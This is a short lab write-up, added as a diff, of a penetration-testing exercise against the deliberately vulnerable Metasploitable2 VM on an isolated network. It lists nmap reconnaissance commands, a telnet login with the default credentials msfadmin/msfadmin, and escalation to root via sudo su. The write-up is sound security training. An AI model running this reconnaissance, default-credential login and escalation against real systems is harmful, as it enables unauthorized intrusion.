@@ -1,0 +1,50 @@
+LAB OBJECTIVE
+-To demonstrate a manually accessed compromised path using network reconnaissance, service prioritization and credential abuse.
+
+ENVIRONMENT
+-Attacker Machine: (Parrot OS bare metal)
+-Target: Metasplotable2 (on Ubuntu Linux)
+-Network: VirtualBox Host-Only
+-Target IP: 192.168.56.101
+
+1.) COMMAND: nmap 192.168.56.101
+Results: 
+-Multiple legacy and insecure services exposed
+-High risk ports of focus were: 21(FTP), 23(Telnet),3306(MySQL)
+**
+
+2.) COMMAND: sudo nmap -O 192.168.56.101
+Results:
+-Target was on a Linux kernel 2.6.x(end of life)
+-Indicates missing modern security
+Note: This was an unsupported OS, which indicates a high probability of sytem vulnerabilities.
+
+3.) Decide Attack Path 
+Results 
+-23/tcp(telnet)
+Reason:
+-Plain text authentication (not encrypted)
+-Direct access to the shell
+
+4.) COMMAND: nmap -sV -p  23 192.168.56.101
+Results:
+-Service: Linux telnetd
+-Confirmation OS level (Not a Sandbox)
+
+5.) COMMAND: telnet 192.168.56.101 23
+Results:
+-Metasploitable2 displayed login credentials (Vulnerable by default)
+-Credentials--> Username:msfadmin
+                Password:msfadmin
+-Successful access!
+
+6.) COMMAND: whoami, id, sudo -l
+Results: 
+-User: msfadmin (whoami)
+-Member of: admin (id)
+-Unrestricted sudo access: (ALL) ALL (sudo -l)
+
+7.) COMMAND: sudo su
+Results: 
+-Escalated privileges
+-Root shell obtained
